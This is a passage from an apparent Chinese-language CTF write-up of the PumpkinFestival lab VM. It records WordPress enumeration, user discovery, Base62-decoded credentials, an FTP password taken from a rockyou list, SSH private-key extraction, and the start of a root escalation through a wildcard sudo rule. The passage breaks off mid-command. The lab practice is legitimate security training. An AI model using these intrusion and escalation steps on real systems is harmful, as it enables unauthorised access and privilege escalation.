/.htaccess.sample<br>[03:16:04] 403 -  295B  - /.htaccess.save<br>[03:16:04] 403 -  295B  - /.htaccess_orig<br>[03:16:04] 403 -  293B  - /.htaccessBAK<br>[03:16:04] 403 -  293B  - /.htaccess_sc<br>[03:16:04] 403 -  294B  - /.htaccessOLD2<br>[03:16:04] 403 -  295B  - /.htaccess.orig<br>[03:16:04] 403 -  293B  - /.htaccessOLD<br>[03:16:04] 403 -  286B  - /.html                                           <br>[03:16:04] 403 -  296B  - /.htaccess_extra<br>[03:16:04] 403 -  285B  - /.htm<br>[03:16:04] 403 -  291B  - /.htpasswds<br>[03:16:04] 403 -  295B  - /.htpasswd_test<br>[03:16:04] 403 -  292B  - /.httr-oauth                                     <br>[03:16:05] 403 -  285B  - /.php                                            <br>[03:16:05] 403 -  286B  - /.php3<br>[03:16:24] 301 -    0B  - /index.php  -&gt;  http://pumpkins.local/            <br>[03:16:24] 301 -    0B  - /index.php/login/  -&gt;  http://pumpkins.local/login/<br>[03:16:25] 200 -   20KB - /license.txt                                      <br>[03:16:32] 200 -  642B  - /readme.html                                      <br>[03:16:33] 403 -  295B  - /server-status/                                   <br>[03:16:33] 403 -  294B  - /server-status<br>[03:16:40] 301 -  318B  - /wp-admin  -&gt;  http://pumpkins.local/wp-admin/    <br>[03:16:40] 200 -    0B  - /wp-content/                                      <br>[03:16:40] 302 -    0B  - /wp-admin/  -&gt;  http://pumpkins.local/wp-login.php?redirect_to=http%3A%2F%2Fpumpkins.<span class="hljs-built_in">local</span>%2Fwp-admin%2F&amp;reauth=1<br>[03:16:40] 301 -  320B  - /wp-content  -&gt;  http://pumpkins.local/wp-content/<br>[03:16:40] 400 -    1B  - /wp-admin/admin-ajax.php                          <br>[03:16:40] 500 -    3KB - /wp-admin/setup-config.php<br>[03:16:40] 200 -    0B  - /wp-config.php                                    <br>[03:16:40] 200 -    1KB - /wp-admin/install.php                             <br>[03:16:40] 403 -  317B  - /wp-content/plugins/akismet/admin.php             <br>[03:16:40] 403 -  319B  - /wp-content/plugins/akismet/akismet.php           <br>[03:16:40] 500 -    0B  - /wp-content/plugins/hello.php                     <br>[03:16:40] 200 -  967B  - /wp-content/uploads/                              <br>[03:16:40] 301 -  321B  - /wp-includes  -&gt;  http://pumpkins.local/wp-includes/<br>[03:16:40] 500 -    0B  - /wp-includes/rss-functions.php                    <br>[03:16:40] 200 -    0B  - /wp-cron.php                                      <br>[03:16:40] 200 -   40KB - /wp-includes/                                     <br>[03:16:40] 200 -    2KB - /wp-login.php                                     <br>[03:16:40] 302 -    0B  - /wp-signup.php  -&gt;  http://pumpkins.local/wp-login.php?action=register<br>[03:16:40] 405 -   42B  - /xmlrpc.php                                       <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>依次查看</p><p><img src="/pic/23a93894c292b323040b2e3a8432bc6a_MD5.png"></p><p>又一个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">5</span>ff346114d634a015ce413e1bc3d8d71<br><span class="hljs-comment"># 第四个PumpkinToken</span><br></code></pre></td></tr></table></figure><p><code>readme.html</code> 的返回有点奇怪，没有 <code>PumpkinToken</code> 的提示，先记录下来吧</p><p><img src="/pic/4742b3546d447b4f8ae171eeeb0f7ae2_MD5.png"></p><p>uploads 目录里只是一张图片，是 wordpress 的常见路径。以防万一下载到本地查看了一下，应该没有隐写</p><p><img src="/pic/beb7a0e22f0634ae079f1821dc4454c2_MD5.png"></p><p><code>/wp-includes/</code> 中也是一些文件，但是没有发现隐藏的<code>PumpkinToken</code></p><p><img src="/pic/e2a67e406386e0128a7ece8a2d79ee85_MD5.png"></p><p>目录爆破的结果中有注册页面，尝试注册，但是这并不是一个真实网站，邮箱收不到注册邮件。既然是 wordpress 网站，wpscan 试试吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ wpscan --url http://pumpkins.local/ -e ap,u<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | \_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://pumpkins.local/ [192.168.56.140]<br>[+] Started: Sun Sep 10 03:24:14 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.7 (Ubuntu)<br> |  - X-Powered-By: PHP/5.5.9-1ubuntu4.29<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://pumpkins.local/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://pumpkins.local/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Registration is enabled: http://pumpkins.local/wp-login.php?action=register<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://pumpkins.local/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://pumpkins.local/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.9.3 identified (Insecure, released on 2018-02-05).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://pumpkins.local/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.3&lt;/generator&gt;<br> |  - http://pumpkins.local/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.3&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://pumpkins.local/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://pumpkins.local/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3, Match: \<span class="hljs-string">&#x27;Version: 1.4\&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] morse<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] loly<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] loly2<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>loly 和 loly2 是我注册的用户名，这里得到了 admin 和 morse 两个用户名。</p><h2 id="base62-编码"><a href="#base62-编码" class="headerlink" title="base62 编码"></a>base62 编码</h2><p>在这里卡了很久，有的时候不只是场景的熟悉度，脑子也得够灵活才能应对。看似我这里已经尽己所能了（除了爆破，尝试了用几个收集到的用户名，常用的 10000 个密码来爆破，没得到结果，使用 rockyou.txt 爆破了一晚上也没跑完）。这里的第一个关键是 <code>readme.html</code></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">K<span class="hljs-number">82</span>v<span class="hljs-number">0</span>SuvV<span class="hljs-number">1</span>E<span class="hljs-symbol">n350</span><span class="hljs-name">M0</span>uxiXVRTmBrQIJQ<span class="hljs-symbol">N78</span>s<br></code></pre></td></tr></table></figure><p>尽管我也尝试了将其作为密码来爆破登录，无论是 ftp 还是 wordpress，但是都没收获。实际上关于这串字符串，常规的解码都得不到答案，但令我受挫的是我没有合理地这串字符串的价值做出判断，只是简单地考虑将其作为密码，虽然也将 PumpkinToken 也作为密码来爆破尝试，不过无效功还是太多。</p><p>通过 <a href="https://gchq.github.io/CyberChef">From Base62 - CyberChef (gchq.github.io)</a> 工具来不断尝试不同的解码方式解密成功</p><p><img src="/pic/162bba049adaed9a0cb465d6c4d30f1a_MD5.png"></p><p>我们拿到了用户名和密码的两对映射，尝试 ssh 登录的时候发现这台机器并不支持 ssh 密码登录，应该是只能通过密钥来登录</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------------------------</span><br><span class="hljs-code">                          Welcome to Mission-Pumpkin</span><br><span class="hljs-code">      All remote connections to this machine are monitored and recorded</span><br><span class="hljs-code">-----------------------------------------------------------------------</span><br><br>jack@192.168.56.140: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>如何获取 ssh 密钥，就需要继续之前提到过的忽略的关键点了。不过我们看到这里还有个 morse 用户名，这和 wpscan 扫描结果中的用户是一致的，我们尝试登录 wordpress 后台看看</p><p><code>morse:Ug0t!TrIpyJ</code> 登录成功，不过用户权限有限，而 admin 的密码并不是这个，翻来翻去只在 Profile 中找到了一个 <code>PumpkinToken</code>。继续看如何获取 ssh 密钥吧。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">7139</span>e925fd43618653e51f820bc6201b<br><span class="hljs-comment"># 第五个PumpkinToken</span><br></code></pre></td></tr></table></figure><h2 id="FTP-爆破"><a href="#FTP-爆破" class="headerlink" title="FTP 爆破"></a>FTP 爆破</h2><p>第二个关键点是 ftp 爆破的问题，这个点确实……如果接下来有台靶机也是这个尿性，我估计还会卡在这里。没办法，爆破字典如果选太大的，爆破时间太久，爆破字典太小又没有结果，自己制作的字典也不一定有效。</p><p>这里靶机制作者把密码放在了 rockyou 里靠后的部分，爆破时间真的长。</p><p>直接在 WP 里看了密码 <code>yrrah</code></p><p>ftp 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ftp 192.168.56.140<br>Connected to 192.168.56.140.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.140:kali): harry</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; ls -alih</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||24552|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwx------    3 1002     1002         4096 Jul 15  2019 .</span><br><span class="hljs-string">drwxr-xr-x    5 0        0            4096 Jul 12  2019 ..</span><br><span class="hljs-string">-rw-------    1 1002     1002            8 Jul 15  2019 .bash_history</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          220 Jul 12  2019 .bash_logout</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002         3637 Jul 12  2019 .bashrc</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          675 Jul 12  2019 .profile</span><br><span class="hljs-string">drwxr-xr-x    3 0        0            4096 Jul 12  2019 Donotopen</span><br><span class="hljs-string">-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br></code></pre></td></tr></table></figure><p>依次查看 <code>.bash_history</code>, <code>token.txt</code>, <code>Donotopen</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> .bash_history                                                                       <br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">exit</span><br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt<br>PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e<br><span class="hljs-comment"># 第六个PumpkinToken</span><br></code></pre></td></tr></table></figure><p><code>Donotopen</code> 是一个目录，不断进去，发现有个文件和一个目录，先把文件下载到本地查看，再进另一个文件查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 bytes received <span class="hljs-keyword">in</span> 00:00 (17.32 KiB/s)<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /home/harry/Donotopen/NO/NOO/NOOO/NOOOO<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||46745|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    3 0        0            4096 Jul 14  2019 NOOOOO<br>-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> NOOOOO<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||52087|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 0        0            4096 Jul 14  2019 NOOOOOO<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> NOOOOOO<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||29574|).<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0            4357 Jul 14  2019 data.txt<br>226 Directory send OK.<br>ftp&gt; get data.txt<br><span class="hljs-built_in">local</span>: data.txt remote: data.txt<br>229 Entering Extended Passive Mode (|||61794|).<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> data.txt (4357 bytes).<br>100% |***********************************************************************|  4357        2.03 MiB/s    00:00 ETA<br>226 Transfer complete.<br>4357 bytes received <span class="hljs-keyword">in</span> 00:00 (1.60 MiB/s)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt<br>PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c<br><span class="hljs-comment"># 第七个PumpkinToken</span><br></code></pre></td></tr></table></figure><h2 id="文件内容里的十六进制"><a href="#文件内容里的十六进制" class="headerlink" title="文件内容里的十六进制"></a>文件内容里的十六进制</h2><p>data.txt 的情况比较复杂，问问 chatgpt</p><p><img src="/pic/ab8a412c4f449a755a9e9ecfe48954cd_MD5.png"></p><p>这方面还是得看它啊</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cp</span> data.txt data.tar                          <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf data.tar <br>data<br>tar: A lone zero block at 8<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file data         <br>data: bzip2 compressed data, block size = 900k<br></code></pre></td></tr></table></figure><p>竟然还是压缩文件，再来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf data    <br>key<br>tar: A lone zero block at 25<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file key <br>key: POSIX tar archive<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf key <br>jack<br>tar: A lone zero block at 22<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file jack<br>jack: ASCII text, with very long lines (10106), with no line terminators<br></code></pre></td></tr></table></figure><p>jack 虽然是文本文件，但是文件内容是十六进制的文本文件，接下来考虑如何将其转换，这里先偷懒用CyberChef</p><p><img src="/pic/52fae1ab298d1ab5e1154560858edb71_MD5.png"></p><h2 id="ssh-私钥登录"><a href="#ssh-私钥登录" class="headerlink" title="ssh 私钥登录"></a>ssh 私钥登录</h2><p>发现竟然就是我们想要的私钥，将其写入文件，使用密钥登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ xxd -r -ps jack  &gt; jack.bin<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ strings jack.bin &gt; sshlogin <br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">chmod</span> 600 sshlogin  <br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ssh -i sshlogin jack@192.168.56.140 -p6880 <br>-----------------------------------------------------------------------<br>                          Welcome to Mission-Pumpkin<br>      All remote connections to this machine are monitored and recorded<br>-----------------------------------------------------------------------<br>jack@192.168.56.140: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>不知道为什么还是报错，加上-vv 参数看看</p><p><img src="/pic/accad25850ad648e119522f39dec495d_MD5.png"></p><p>找到了原因，还是经典的问题，加上参数继续</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ssh -i jackkey.key jack@192.168.56.140 -p 6880 -oPubkeyAcceptedKeyTypes=+ssh-rsa <br>------------------------------------------------------------------------------<br>                          Welcome to Mission-Pumpkin<br>      All remote connections to this machine are monitored and recorded<br>------------------------------------------------------------------------------<br><br>Last login: Tue Jul 16 08:12:07 2019 from 192.168.1.105<br>-bash: /home/jack/.bash_profile: Permission denied<br>jack@pumpkin:~$ <span class="hljs-built_in">whoami</span><br>jack<br>jack@pumpkin:~$ <span class="hljs-built_in">id</span><br>uid=1000(jack) gid=1000(jack) <span class="hljs-built_in">groups</span>=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)<br>jack@pumpkin:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fa:92:8e brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fefa:928e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>jack@pumpkin:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> jack: <br>Matching Defaults entries <span class="hljs-keyword">for</span> jack on pumpkin:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User jack may run the following commands on pumpkin:<br>    (ALL) /home/jack/pumpkins/alohomora*<br></code></pre></td></tr></table></figure><h2 id="构建同名文件-sudo-权限提权"><a href="#构建同名文件-sudo-权限提权" class="headerlink" title="构建同名文件 sudo 权限提权"></a>构建同名文件 sudo 权限提权</h2><p>sudo -l 使用的是 wordpress 的密码 <code>Ug0t!TrIpyJ</code>，给的路径是不存在的，所以我们可以尝试自己构建一个该路径下的文件</p><p>其实这里的*是通配符，构建的文件名可以直接为alohomora</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@pumpkin:~$ <span class="hljs-built_in">mkdir</span> pumpkins<br>jack@pumpkin:~$ <span class="hljs-built_in">cd</span> pumpkins/<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash 